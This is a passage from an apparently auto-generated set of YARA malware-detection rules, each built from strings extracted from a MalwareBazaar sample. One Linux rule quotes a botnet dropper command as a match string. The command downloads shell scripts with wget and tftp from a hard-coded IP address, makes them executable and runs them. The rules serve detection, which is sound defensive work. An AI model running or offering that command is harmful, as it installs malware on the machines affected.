        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "HTTP/1.1"
        $s2 = "User-Agent:"
        $s3 = "http"
        $s4 = "HTTP/1.1 404 Not Found"
        $s5 = "HTTP/1.1 200 OK"
        $s6 = "/bin/systemd"
        $s7 = "bin/systemd"
        $s8 = "GET /%s HTTP/1.0"
        $s9 = "User-Agent: Update v1.0"
        $s10 = "No such file or directory"
        $s11 = "No such process"
        $s12 = "Interrupted system call"
        $s13 = "Bad file descriptor"
        $s14 = "No child processes"
        $s15 = "Resource temporarily unavailable"
        $s16 = "File exists"
        $s17 = "Too many open files in system"
        $s18 = "Too many open files"
        $s19 = "Text file busy"
        $s20 = "File too large"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 70KB and
        all of them
}

rule Windows_01eca6dc5526b640faa166e8d498f4b6dee2ff0f9036cd8e4b9aa7e0581fa931
{
    meta:
        description = "Auto ML: 01eca6dc5526b640faa166e8d498f4b6dee2ff0f9036cd8e4b9aa7e0581fa931"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "FlsSetValue"
        $s6 = "FlsGetValue"
        $s7 = "CorExitProcess"
        $s8 = "An application has made an attempt to load the C runtime library incorrectly."
        $s9 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s10 = "- Attempt to initialize the CRT more than once."
        $s11 = "- unable to open console device"
        $s12 = "- unexpected multithread lock error"
        $s13 = "- not enough space for thread data"
        $s14 = "- floating point support not loaded"
        $s15 = "SystemFunction036"
        $s16 = "ADVAPI32.DLL"
        $s17 = "`local static thread guard'"
        $s18 = "`placement delete[] closure'"
        $s19 = "`placement delete closure'"
        $s20 = "delete[]"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 338KB and
        all of them
}

rule Linux_18425ac992c9d09be27e46a9c8c5fb5a46940d26ed3132b292d4e40432166edf
{
    meta:
        description = "Auto ML: 18425ac992c9d09be27e46a9c8c5fb5a46940d26ed3132b292d4e40432166edf"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Mozilla/4.0 (Compatible; MSIE 8.0; Windows NT 5.2; Trident/6.0)"
        $s2 = "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)"
        $s3 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; pl) Opera 11.00"
        $s4 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; en) Opera 11.00"
        $s5 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; ja) Opera 11.00"
        $s6 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; de) Opera 11.01"
        $s7 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; fr) Opera 11.00"
        $s8 = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36"
        $s9 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36"
        $s10 = "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
        $s11 = "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0"
        $s12 = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36"
        $s13 = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36"
        $s14 = "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
        $s15 = "Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)"
        $s16 = "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51"
        $s17 = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36"
        $s18 = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.94 Safari/537.36"
        $s19 = "Mozilla/4.0 (compatible; MSIE 9.0; Windows 98; .NET CLR 3.0.04506.30)"
        $s20 = "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 114KB and
        all of them
}

rule Windows_ff0bd362c496178316aa66375828349d11825dd9afaa90c5ece39a401e4e0a7d
{
    meta:
        description = "Auto ML: ff0bd362c496178316aa66375828349d11825dd9afaa90c5ece39a401e4e0a7d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "<Module>"
        $s5 = "ThreadSafeObjectProvider`1"
        $s6 = "Settings"
        $s7 = "ClientSocket"
        $s8 = "ProcessCritical"
        $s9 = "System"
        $s10 = "get_Computer"
        $s11 = "get_Application"
        $s12 = "User"
        $s13 = "get_User"
        $s14 = "m_UserObjectProvider"
        $s15 = "get_WebServices"
        $s16 = "GetHashCode"
        $s17 = "GetType"
        $s18 = "Create__Instance__"
        $s19 = "get_GetInstance"
        $s20 = "m_ThreadStaticValue"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 207KB and
        all of them
}

rule Windows_ff3718ae6bd59ad479e375c602a81811718dfb2669c2d1de497f02baf7b4adca
{
    meta:
        description = "Auto ML: ff3718ae6bd59ad479e375c602a81811718dfb2669c2d1de497f02baf7b4adca"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "``.data"
        $s3 = ".rdata"
        $s4 = "h.reloc"
        $s5 = "GetProcAddress"
        $s6 = "GetModuleHandleA"
        $s7 = "setX"
        $s8 = "GetVersionExW"
        $s9 = "GetProcessWindowStation"
        $s10 = "4DGEt"
        $s11 = "USER32.dll"
        $s12 = "GetModuleFileNameW"
        $s13 = "golang.dll"
        $s14 = "GetVersionExA"
        $s15 = "KERNEL32.dll"
        $s16 = "GetUserObjectInformationW"
        $s17 = "ErGET"
        $s18 = "WTSAPI32.dll"
        $s19 = "GetSystemTimeAsFileTime"
        $s20 = "ExitProcess"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 8787KB and
        all of them
}

rule Windows_ffac444851a42f7558f0340117534223c09e3c1222ee4f1d4d62812b583bd982
{
    meta:
        description = "Auto ML: ffac444851a42f7558f0340117534223c09e3c1222ee4f1d4d62812b583bd982"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "CorExitProcess"
        $s6 = "FlsSetValue"
        $s7 = "FlsGetValue"
        $s8 = "GetProcessWindowStation"
        $s9 = "GetUserObjectInformationW"
        $s10 = "GetLastActivePopup"
        $s11 = "GetActiveWindow"
        $s12 = "`local static thread guard'"
        $s13 = "`placement delete[] closure'"
        $s14 = "`placement delete closure'"
        $s15 = "delete[]"
        $s16 = "delete"
        $s17 = "RtlGetVersion"
        $s18 = "GetProcessId"
        $s19 = "GetLayeredWindowAttributes"
        $s20 = "MB_GetString"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 806KB and
        all of them
}

rule Linux_ffeb3720ee75e1819e7275b0742ff382765579d882124beffa9a34a306d62495
{
    meta:
        description = "Auto ML: ffeb3720ee75e1819e7275b0742ff382765579d882124beffa9a34a306d62495"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "HTTP/1.1"
        $s2 = "User-Agen["
        $s3 = "http"
        $s4 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
        $s5 = "PROT_EXEC|PROT_WRITE failed."
    condition:
        uint32(0) == 0x464c457f and
        filesize < 28KB and
        all of them
}

rule Windows_18570b99c7651d0400796686a5bfab737cd43f87228bd7fce152b0cc1027f1cb
{
    meta:
        description = "Auto ML: 18570b99c7651d0400796686a5bfab737cd43f87228bd7fce152b0cc1027f1cb"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "<System-Collections-Generic-IEnumerable<System-WindowsBitmap-Docking-AutoHideStripBase-Tab>-GetEnumerator>d__0"
        $s5 = "<System-Collections-Generic-IEnumerable<System-WindowsBitmap-Docking-DockPaneStripBase-Tab>-GetEnumerator>d__0"
        $s6 = "<System-Collections-IEnumerable-GetEnumerator>d__1"
        $s7 = "ReadOnlyCollection`1"
        $s8 = "get_DataTable1"
        $s9 = "get_DataColumn1"
        $s10 = "set_DataColumn1"
        $s11 = "get_DockPanel_Persistor_XmlFileComment1"
        $s12 = "<get_Documents>d__112"
        $s13 = "System.WindowsBitmap.Docking.Win32"
        $s14 = "ReadInt32"
        $s15 = "get_DockPanel_Persistor_XmlFileComment2"
        $s16 = "<System-Collections-Generic-IEnumerable<System-WindowsBitmap-Docking-AutoHideStripBase-Pane>-GetEnumerator>d__15"
        $s17 = "<System-Collections-IEnumerable-GetEnumerator>d__16"
        $s18 = "<Module>"
        $s19 = "System.Drawing.Drawing2D"
        $s20 = "WM_USERCHANGED"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 751KB and
        all of them
}

rule Windows_1862317879e1cfcaff8a4c2355f8d88b0911a4c848773f54bcb82c48f20480e6
{
    meta:
        description = "Auto ML: 1862317879e1cfcaff8a4c2355f8d88b0911a4c848773f54bcb82c48f20480e6"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "@.reloc"
        $s6 = "GetNativeSystemInfo"
        $s7 = "kernel32.dll"
        $s8 = "FlsGetValue"
        $s9 = "FlsSetValue"
        $s10 = "delete"
        $s11 = "delete[]"
        $s12 = "`placement delete closure'"
        $s13 = "`placement delete[] closure'"
        $s14 = "`local static thread guard'"
        $s15 = "CorExitProcess"
        $s16 = "GetCurrentPackageId"
        $s17 = "GetDateFormatEx"
        $s18 = "GetSystemTimePreciseAsFileTime"
        $s19 = "GetTimeFormatEx"
        $s20 = "internal error: invalid forward reference offset"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1418KB and
        all of them
}

rule Windows_1864a38b10dbaa7cc52167986e7575d6464c3eee49a971f3c78fc87d7e16492a
{
    meta:
        description = "Auto ML: 1864a38b10dbaa7cc52167986e7575d6464c3eee49a971f3c78fc87d7e16492a"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "<GetFiltes>b__0"
        $s5 = "PROCESSENTRY32"
        $s6 = "Microsoft.Win32"
        $s7 = "ReadInt32"
        $s8 = "WriteUInt64"
        $s9 = "GetAsUInt64"
        $s10 = "SetAsUInt64"
        $s11 = "InvalidImageWin16"
        $s12 = "ReadInt16"
        $s13 = "<Module>"
        $s14 = "ES_SYSTEM_REQUIRED"
        $s15 = "GetTypeFromCLSID"
        $s16 = "th32ModuleID"
        $s17 = "th32ProcessID"
        $s18 = "th32ParentProcessID"
        $s19 = "get_FormatID"
        $s20 = "get_ASCII"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 64KB and
        all of them
}

rule Windows_18f9d778efc5dcb90c7ae7ccaacdfd8b9041295447759c1811e99a5d0a48dcda
{
    meta:
        description = "Auto ML: 18f9d778efc5dcb90c7ae7ccaacdfd8b9041295447759c1811e99a5d0a48dcda"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "<Module>"
        $s5 = "createMT"
        $s6 = "set_ChartArea"
        $s7 = "add_Load"
        $s8 = "dothi_Load"
        $s9 = "F_Detail_Load"
        $s10 = "get_Checked"
        $s11 = "set_Handled"
        $s12 = "set_Legend"
        $s13 = "get_KeyCode"
        $s14 = "set_AutoScaleMode"
        $s15 = "get_Message"
        $s16 = "set_Visible"
        $s17 = "GetTypeFromHandle"
        $s18 = "set_FormBorderStyle"
        $s19 = "set_Name"
        $s20 = "set_Multiline"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 555KB and
        all of them
}

rule Linux_190a561a9c0c5b61acf0621c2825834fe200c3b617537131de98f666ca7cb2d0
{
    meta:
        description = "Auto ML: 190a561a9c0c5b61acf0621c2825834fe200c3b617537131de98f666ca7cb2d0"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Windows XP"
        $s2 = "M-SEARCH * HTTP/1.1"
        $s3 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows"
        $s4 = "socket:["
        $s5 = ".text"
        $s6 = ".data"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 50KB and
        all of them
}

rule Windows_1a0885223c50263c153be36ffdcccd5c217e00a2e1f04893a836a37a6c0cd8a7
{
    meta:
        description = "Auto ML: 1a0885223c50263c153be36ffdcccd5c217e00a2e1f04893a836a37a6c0cd8a7"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "CorExitProcess"
        $s6 = "An application has made an attempt to load the C runtime library incorrectly."
        $s7 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s8 = "- Attempt to initialize the CRT more than once."
        $s9 = "- unable to open console device"
        $s10 = "- unexpected multithread lock error"
        $s11 = "- not enough space for thread data"
        $s12 = "- floating point support not loaded"
        $s13 = "FlsSetValue"
        $s14 = "FlsGetValue"
        $s15 = "SystemFunction036"
        $s16 = "ADVAPI32.DLL"
        $s17 = "GetProcessWindowStation"
        $s18 = "GetUserObjectInformationA"
        $s19 = "GetLastActivePopup"
        $s20 = "GetActiveWindow"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 290KB and
        all of them
}

rule Windows_1a1dc33fae444afdd54f6f50dd47ed4b9f673fbc5595dad7b48e78cac0458465
{
    meta:
        description = "Auto ML: 1a1dc33fae444afdd54f6f50dd47ed4b9f673fbc5595dad7b48e78cac0458465"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "lSystem.Resources.ResourceReader, mscorlib, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s5 = "hSystem.Drawing.Bitmap, System.Drawing, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPAD"
        $s6 = "QSystem.Drawing, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a"
        $s7 = "System.Drawing.Bitmap"
        $s8 = "socru.exe"
        $s9 = "System.Windows.Forms"
        $s10 = "System"
        $s11 = "System.Drawing"
        $s12 = "<Module>"
        $s13 = "get_Chars"
        $s14 = "System.Text"
        $s15 = "GetTypeFromHandle"
        $s16 = "GetMethod"
        $s17 = "System.Reflection"
        $s18 = "EncGetBytes"
        $s19 = "GetB"
        $s20 = "get_Default"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 304KB and
        all of them
}

rule Windows_1a689eff429db78a6232912e5c6fb5be880b89f6016f26a1886331f174cb4086
{
    meta:
        description = "Auto ML: 1a689eff429db78a6232912e5c6fb5be880b89f6016f26a1886331f174cb4086"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "`.reloc"
        $s2 = "@.rsrc"
        $s3 = "kernel32.dll"
        $s4 = "SetgQT"
        $s5 = "GetProcAddress"
        $s6 = "LoadLibraryA"
        $s7 = "ExitProcess"
        $s8 = "GetModuleHandleA"
        $s9 = "CMdk"
        $s10 = "USER32.dll"
        $s11 = "GetDC"
        $s12 = "type=\"win32\""
        $s13 = "name=\"Microsoft.Windows.Common-Controls\""
        $s14 = "processorArchitecture=\"*\"/>"
        $s15 = "https://sectigo.com/CPS0"
        $s16 = "3http://crl.sectigo.com/SectigoRSATimeStampingCA.crl0t"
        $s17 = "3http://crt.sectigo.com/SectigoRSATimeStampingCA.crt0#"
        $s18 = "http://ocsp.sectigo.com0"
        $s19 = "The USERTRUST Network1.0,"
        $s20 = "%USERTrust RSA Certification Authority0"
    condition:
        uint32(0) == 0x00785a4d and
        filesize < 4319KB and
        all of them
}

rule Windows_1a69f2fcfe5b35bf44ea42a1efe89f18f6b0d522cbbea5c51bae93aff7d3188b
{
    meta:
        description = "Auto ML: 1a69f2fcfe5b35bf44ea42a1efe89f18f6b0d522cbbea5c51bae93aff7d3188b"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "kernel32.dll"
        $s5 = "comctl32.dll"
        $s6 = "shell32.dll"
        $s7 = "GetLastError"
        $s8 = "GetConsoleCP"
        $s9 = "WriteConsoleW"
        $s10 = "CloseHandle"
        $s11 = "ReadConsoleW"
        $s12 = "FlatSB_SetScrollProp"
        $s13 = "ImageList_GetIcon"
        $s14 = "SHGetSpecialFolderLocation"
        $s15 = "SHGetDiskFreeSpaceExW"
        $s16 = "WIN\\uPNN"
        $s17 = "vIN=zINQwINqwIN=zIN=zIN=zIN=zIN"
        $s18 = "wINaxIN=zIN=zIN=zIN=zIN=zIN=zIN=zIN"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5402KB and
        all of them
}

rule Linux_01f70016a0f13a5f9e561d0d5d60e7cc0f8087e1e124efb1468ff9fdb30ab8e4
{
    meta:
        description = "Auto ML: 01f70016a0f13a5f9e561d0d5d60e7cc0f8087e1e124efb1468ff9fdb30ab8e4"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "PROT_EXEC|PROT_WRITE failed."
        $s2 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 1146KB and
        all of them
}

rule Windows_1a6d94f2ab51427dfd73ca45065cd28e16e215d4d6da2f17603ed633f207ceb0
{
    meta:
        description = "Auto ML: 1a6d94f2ab51427dfd73ca45065cd28e16e215d4d6da2f17603ed633f207ceb0"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "GetInt32"
        $s5 = "WindowsFormsApplication6"
        $s6 = "<Module>"
        $s7 = "System.IO"
        $s8 = "System.Data"
        $s9 = "getData"
        $s10 = "loaddata"
        $s11 = "Read"
        $s12 = "Form1_Load"
        $s13 = "layMNV_Load"
        $s14 = "HosoNV_Load"
        $s15 = "add_Load"
        $s16 = "ChiTietChamCong_Load"
        $s17 = "Luong_Load"
        $s18 = "DangKi_Load"
        $s19 = "PhuCap_Load"
        $s20 = "DangNhap_Load"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 53248KB and
        all of them
}

rule Windows_1abb073f9331743ed6fe25f4148922f764da131385b8195abd77f30eed9f9724
{
    meta:
        description = "Auto ML: 1abb073f9331743ed6fe25f4148922f764da131385b8195abd77f30eed9f9724"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "@.rsrc"
        $s5 = "@.reloc"
        $s6 = "Cannot read Table of Contents."
        $s7 = "Failed to extract %s: failed to allocate temporary input buffer!"
        $s8 = "Failed to extract %s: failed to allocate temporary output buffer!"
        $s9 = "Failed to extract %s: failed to allocate temporary buffer!"
        $s10 = "Failed to extract %s: failed to read data chunk!"
        $s11 = "fread"
        $s12 = "Failed to extract %s: failed to write data chunk!"
        $s13 = "fwrite"
        $s14 = "Failed to extract %s: failed to open archive file!"
        $s15 = "Failed to extract %s: failed to open target file!"
        $s16 = "fopen"
        $s17 = "Failed to read cookie!"
        $s18 = "Could not read full TOC!"
        $s19 = "Error on file."
        $s20 = "Error opening archive %s"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 18133KB and
        all of them
}

rule Windows_1ae44da31999dac7b928f3ff8d08f2bdbe448f593c81448f586d7353b0eded7b
{
    meta:
        description = "Auto ML: 1ae44da31999dac7b928f3ff8d08f2bdbe448f593c81448f586d7353b0eded7b"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "<Module>"
        $s5 = "ThreadSafeObjectProvider`1"
        $s6 = "System"
        $s7 = "get_Computer"
        $s8 = "get_Application"
        $s9 = "User"
        $s10 = "get_User"
        $s11 = "m_UserObjectProvider"
        $s12 = "get_WebServices"
        $s13 = "GetHashCode"
        $s14 = "GetType"
        $s15 = "Create__Instance__"
        $s16 = "get_GetInstance"
        $s17 = "m_ThreadStaticValue"
        $s18 = "GetInstance"
        $s19 = "System.Text"
        $s20 = "user32.dll"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 36KB and
        all of them
}

rule Windows_1af4b1e67dee34e1ce541150c83e1be4f75766d47ecebf4b476cb08aa04fa837
{
    meta:
        description = "Auto ML: 1af4b1e67dee34e1ce541150c83e1be4f75766d47ecebf4b476cb08aa04fa837"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s5 = "PThe calling thread cannot access this object because a different thread owns it."
        $s6 = "=Package already has a root DocumentSequence or FixedDocument."
        $s7 = "$Container already has Starting Part."
        $s8 = "-PackagePart already has associated Thumbnail."
        $s9 = "\"Cannot modify read-only container."
        $s10 = ")Not all opened dependents were committed."
        $s11 = "XPS document was closed."
        $s12 = "Package is not open for reading."
        $s13 = "@ReadXML method expects reader to have just parsed start element."
        $s14 = "7Obfuscated font resources require valid GUID file name."
        $s15 = "\"Only writers can call this method."
        $s16 = "+OpenDocument or OpenElement already called."
        $s17 = "\"PrintTicket was already committed."
        $s18 = "CCount must be 1 when CommitPolicies is set to CommitEntireSequence."
        $s19 = "!'{0}' service type already added."
        $s20 = "9Cannot release XmlWriter because it was already released."
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 526KB and
        all of them
}

rule Linux_1b4440f5d9c12166ae6112e0cd1dacdb5fb7859cbc2a2d375c4e397b13a6dae6
{
    meta:
        description = "Auto ML: 1b4440f5d9c12166ae6112e0cd1dacdb5fb7859cbc2a2d375c4e397b13a6dae6"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "cd /tmp; wget http://45.90.217.165/bins.sh; chmod 777 *; sh bins.sh; tftp -g 45.90.217.165 -r tftp.sh; chmod 777 *; sh tftp.sh; rm -rf *.sh"
        $s2 = "user"
        $s3 = "User"
        $s4 = "shell"
        $s5 = "system"
        $s6 = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
        $s7 = "FAST-WebCrawler/3.6 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)"
        $s8 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)"
        $s9 = "BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)"
        $s10 = "Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201"
        $s11 = "FAST-WebCrawler/3.7 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)"
        $s12 = "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1"
        $s13 = "zspider/0.9-dev http://feedback.redkolibri.com/"
        $s14 = "Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)"
        $s15 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)"
        $s16 = "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51"
        $s17 = "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
        $s18 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194ABaiduspider+(+http://www.baidu.com/search/spider.htm)"
        $s19 = "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko"
        $s20 = "Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 102KB and
        all of them
}

rule Windows_1b4ab1c22660bbdd2c800847f9ef7450d7bbe7e7629360cdeff21196188cb3fb
{
    meta:
        description = "Auto ML: 1b4ab1c22660bbdd2c800847f9ef7450d7bbe7e7629360cdeff21196188cb3fb"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".rsrc"
        $s2 = "'uVgetB"
        $s3 = "kernel32.dll"
        $s4 = "GetModuleHandleA"
        $s5 = "mscoree.dll"
        $s6 = "If you want to change the Windows User Account Control level replace the"
        $s7 = "requestedExecutionLevel node with one of the following."
        $s8 = "<requestedExecutionLevel  level=\"requireAdministrator\" uiAccess=\"false\" />"
        $s9 = "Specifying requestedExecutionLevel element will disable file and registry virtualization."
        $s10 = "<defaultAssemblyRequest permissionSetReference=\"Custom\" />"
        $s11 = "<PermissionSet class=\"System.Security.PermissionSet\" version=\"1\" Unrestricted=\"true\" ID=\"Custom\" SameSite=\"site\" />"
        $s12 = "<!-- A list of the Windows versions that this application has been tested on"
        $s13 = "and Windows will automatically select the most compatible environment. -->"
        $s14 = "<!-- Windows Vista -->"
        $s15 = "<!-- Windows 7 -->"
        $s16 = "<!-- Windows 8 -->"
        $s17 = "<!-- Windows 8.1 -->"
        $s18 = "<!-- Windows 10 -->"
        $s19 = "<!-- Indicates that the application is DPI-aware and will not be automatically scaled by Windows at higher"
        $s20 = "DPIs. Windows Presentation Foundation (WPF) applications are automatically DPI-aware and do not need"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3534KB and
        all of them
}

rule Linux_1b4ddc967aa3341262781c900be143d6dfe89e7912a176d77c15e0cb6fe66a14
{
    meta:
        description = "Auto ML: 1b4ddc967aa3341262781c900be143d6dfe89e7912a176d77c15e0cb6fe66a14"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
        $s2 = "PROT_EXEC|PROT_WRITE failed."
    condition:
        uint32(0) == 0x464c457f and
        filesize < 30KB and
        all of them
}

rule Windows_1b67f0a811bcf89e4d5d7c3217605d576c0b3e8164669d6536220c8ddfa3a466
{
    meta:
        description = "Auto ML: 1b67f0a811bcf89e4d5d7c3217605d576c0b3e8164669d6536220c8ddfa3a466"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".rsrc"
        $s2 = "Kernel32.dll"
        $s3 = "GetModu"
        $s4 = "LoadLibrary"
        $s5 = "window"
        $s6 = "J6winLrm"
